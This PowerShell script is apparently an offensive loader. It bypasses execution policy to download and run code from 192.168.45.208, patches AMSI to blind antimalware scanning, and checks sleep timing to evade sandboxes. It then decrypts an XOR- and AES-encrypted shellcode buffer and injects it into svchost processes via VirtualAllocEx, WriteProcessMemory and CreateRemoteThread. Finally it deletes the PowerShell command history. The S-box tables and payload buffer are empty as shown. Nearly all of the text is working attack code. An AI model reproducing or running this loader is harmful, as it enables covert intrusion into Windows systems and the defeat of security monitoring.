function Invoke-Xorfe856ea973e94a68bd3ceddc0e9fbdbf {
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )

    Write-Host "[+] Decrypting from XOR"
    $key = [System.Text.Encoding]::UTF8.GetBytes("w84p;:,oUxsX")

    [byte[]]$encoded = New-Object byte[] $Data.Length
    
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $encoded[$i] = [byte]($Data[$i] -bxor $key[$i % $key.Length])
    }

    return $encoded
}function Invoke-AesDecrypt_1b6d18f3948b47c9abd9bf44470ec2cc {
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )

    Write-Host "[+] Decrypting from Custom AES"
    
    # Explicitly define as byte arrays
    [byte[]]$Key = [byte[]]@(18,217,16,80,51,151,70,164,5,104,93,250,93,194,99,208)
    [byte[]]$IV = [byte[]]@(26,127,169,190,62,39,185,250,253,106,102,169,33,29,244,196)

    # S-Box and Inverse S-Box tables (explicitly cast as byte arrays)
    [byte[]]$SBox = @(
        
    )

    [byte[]]$InvSBox = @(
        
    )

    # Modified array handling in functions
    function GMul {
        param(
            [byte]$a,
            [byte]$b
        )
        [byte]$p = 0
        for($i = 0; $i -lt 8; $i++) {
            if(($b -band 1) -ne 0) { $p = [byte]($p -bxor $a) }
            $highBit = $a -band 0x80
            $a = [byte](($a -shl 1) -band 0xFF)
            if($highBit -ne 0) { $a = [byte]($a -bxor 0x1b) }
            $b = [byte]($b -shr 1)
        }
        return $p
    }

    function AddRoundKey {
        param([byte[,]]$state, [byte[]]$roundKey, [int]$round)
        for($i = 0; $i -lt 4; $i++) {
            for($j = 0; $j -lt 4; $j++) {
                $state[$j,$i] = [byte]($state[$j,$i] -bxor $roundKey[$round * 16 + $i * 4 + $j])
            }
        }
    }

    function InvShiftRows {
        param([byte[,]]$state)
        # Row 1
        $temp = $state[1,3]
        $state[1,3] = $state[1,2]
        $state[1,2] = $state[1,1]
        $state[1,1] = $state[1,0]
        $state[1,0] = $temp

        # Row 2
        $temp = $state[2,3]
        $state[2,3] = $state[2,1]
        $state[2,1] = $temp
        $temp = $state[2,2]
        $state[2,2] = $state[2,0]
        $state[2,0] = $temp

        # Row 3
        $temp = $state[3,0]
        $state[3,0] = $state[3,1]
        $state[3,1] = $state[3,2]
        $state[3,2] = $state[3,3]
        $state[3,3] = $temp
    }

    function InvSubBytes {
        param([byte[,]]$state)
        for($row = 0; $row -lt 4; $row++) {
            for($col = 0; $col -lt 4; $col++) {
                $state[$row,$col] = $InvSBox[$state[$row,$col]]
            }
        }
    }

    function InvMixColumns {
        param([byte[,]]$state)
        for($col = 0; $col -lt 4; $col++) {
            $s0 = $state[0,$col]
            $s1 = $state[1,$col]
            $s2 = $state[2,$col]
            $s3 = $state[3,$col]

            $state[0,$col] = (GMul 0x0e $s0) -bxor (GMul 0x0b $s1) -bxor (GMul 0x0d $s2) -bxor (GMul 0x09 $s3)
            $state[1,$col] = (GMul 0x09 $s0) -bxor (GMul 0x0e $s1) -bxor (GMul 0x0b $s2) -bxor (GMul 0x0d $s3)
            $state[2,$col] = (GMul 0x0d $s0) -bxor (GMul 0x09 $s1) -bxor (GMul 0x0e $s2) -bxor (GMul 0x0b $s3)
            $state[3,$col] = (GMul 0x0b $s0) -bxor (GMul 0x0d $s1) -bxor (GMul 0x09 $s2) -bxor (GMul 0x0e $s3)
        }
    }

    # Key expansion with explicit byte array
    [byte[]]$expandedKey = New-Object byte[] 176
    for($i = 0; $i -lt 16; $i++) {
        $expandedKey[$i] = $Key[$i]
    }
    
    [byte]$rcon = 1
    for($i = 16; $i -lt 176; $i += 4) {
        [byte[]]$temp = New-Object byte[] 4
        for($j = 0; $j -lt 4; $j++) {
            $temp[$j] = $expandedKey[$i - 4 + $j]
        }

        if($i % 16 -eq 0) {
            # Rotate word
            [byte]$t = $temp[0]
            $temp[0] = $temp[1]
            $temp[1] = $temp[2]
            $temp[2] = $temp[3]
            $temp[3] = $t

            # SubBytes
            for($j = 0; $j -lt 4; $j++) {
                $temp[$j] = $SBox[$temp[$j]]
            }

            # XOR with Rcon
            $temp[0] = [byte]($temp[0] -bxor $rcon)
            $rcon = (GMul $rcon 0x02)
        }

        for($j = 0; $j -lt 4; $j++) {
            $expandedKey[$i + $j] = [byte]($expandedKey[$i - 16 + $j] -bxor $temp[$j])
        }
    }

    # Process blocks
    [byte[]]$result = New-Object byte[] $Data.Length
    $Data.CopyTo($result, 0)
    [byte[]]$prevBlock = New-Object byte[] 16
    $IV.CopyTo($prevBlock, 0)
    
    for($i = 0; $i -lt $Data.Length; $i += 16) {
        $currentBlock = New-Object byte[] 16
        [Array]::Copy($Data, $i, $currentBlock, 0, 16)
        
        $state = New-Object 'byte[,]' 4,4
        for($row = 0; $row -lt 4; $row++) {
            for($col = 0; $col -lt 4; $col++) {
                $state[$row,$col] = $currentBlock[$col * 4 + $row]
            }
        }

        # Initial round
        AddRoundKey $state $expandedKey 10

        # Main rounds
        for($round = 9; $round -ge 1; $round--) {
            InvShiftRows $state
            InvSubBytes $state
            AddRoundKey $state $expandedKey $round
            InvMixColumns $state
        }

        # Final round
        InvShiftRows $state
        InvSubBytes $state
        AddRoundKey $state $expandedKey 0

        # Convert back and XOR with previous block (CBC mode)
        for($row = 0; $row -lt 4; $row++) {
            for($col = 0; $col -lt 4; $col++) {
                $result[$i + $col * 4 + $row] = [byte]($state[$row,$col] -bxor $prevBlock[$col * 4 + $row])
            }
        }

        # Save current block for next iteration
        [Array]::Copy($currentBlock, $prevBlock, 16)
    }

    # Remove PKCS7 padding
    $padding = $result[$result.Length - 1]
    if($padding -gt 0 -and $padding -le 16) {
        return $result[0..($result.Length - $padding - 1)]
    }
    
    return $result
}


$my_dbg=$false
function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}



function getDelegateType {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
 [Parameter(Position = 1)] [Type] $delType = [Void]
 )
 $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
 $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}

if($env:PROCESSOR_ARCHITEW6432 -eq "AMD64"){ &"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -Exec bypass -NonInteractive -NoProfile "iex (new-object net.webclient).downloadstring('http://192.168.45.208/payload.txt')"}

$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne 0){if($my_dbg){Write-Host "[+] Found 4m5iCtx"};[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);if($my_dbg){Write-Host "[+] Overwrote 4m5iCtx"}}
$starttime = Get-Date -Displayhint Time
Start-sleep -s 5
$finishtime = Get-Date -Displayhint Time
if ( $finishtime -le $starttime.addseconds(4.5) ) {
  if($my_dbg){Write-Host "[-] Sl33p timing is off, something is sus, exiting >:("};exit
}

$buf = [Byte[]] ()

$buf = Invoke-Xorfe856ea973e94a68bd3ceddc0e9fbdbf -Data $buf
$buf = Invoke-AesDecrypt_1b6d18f3948b47c9abd9bf44470ec2cc -Data $buf


$user=[Security.Principal.WindowsIdentity]::GetCurrent(); $isBoss=(New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
if($isBoss){$procs=(Get-Process svchost -IncludeUserName | Where-Object {$_.UserName -eq "NT AUTHORITY\SYSTEM"}); if($procs.Length -eq 0){$procs=(Get-Process svchost | Where-Object {$_.Path -ne $null})}} else{$procs=(Get-Process svchost | Where-Object {$_.Path -ne $null})}

ForEach($proc in $procs){
  $hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $proc.Id)
  if($hprocess -ne 0){
    if($my_dbg){Write-Host "[+] Successfully opened $($proc.name),$($proc.id)"}
    $addr= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hprocess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40);
    if($addr -eq 0){
      if($my_dbg){Write-Host "[-] Unable to alloc Mem"}
      continue
    }
    if($my_dbg){Write-Host "[+] Successfully allocd Mem"}

    [Int32]$lpNumberOfBytesWritten = 0
    $ret=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addr, $buf, $buf.length, [ref]$lpNumberOfBytesWritten)
    if(!$ret){
      if($my_dbg){Write-Host "[-] Unable to write Mem"}
      continue
    }
    if($my_dbg){Write-Host "[+] Successfully wrote Mem"}

    $ret=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)
    if($ret -eq 0){
      if($my_dbg){Write-Host "[-] Unable to create thr34d"}
      continue
    }
    if($my_dbg){Write-Host "[+] Successfully made thr34d"}
    break
  }
  if($my_dbg){Write-Host "[-] Unable to open $($proc.name),$($proc.id)"}
}
Remove-Item "$Env:APPDATA\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue